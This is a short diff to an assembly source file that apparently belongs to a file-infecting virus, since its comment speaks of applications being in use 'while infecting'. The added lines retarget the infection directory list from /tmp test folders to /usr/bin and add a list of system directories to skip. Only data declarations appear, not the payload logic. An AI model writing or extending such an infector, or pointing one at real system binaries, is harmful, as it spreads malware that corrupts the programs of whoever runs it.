@@ -1271,6 +1271,9 @@ null db 0
 ; NOTE: root wont work because there are background processes using those applications while infecting
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 excl_dir db `.`, 0, `..`, 0, 0
+root_dirs db `/usr/bin`,0,0
+excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, `dev`, 0, `lost+found`, 0, `media`, 0, `mnt`, 0, `opt`, 0, `proc`, 0, `boot`, 0, `run`, 0, `var`, 0, `home`, 0, `lib`, 0, `src`, 0, `share`, 0, `include`, 0, `sbattach`, 0, 0
+
 %else
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 excl_dir db `.`, 0, `..`, 0, 0
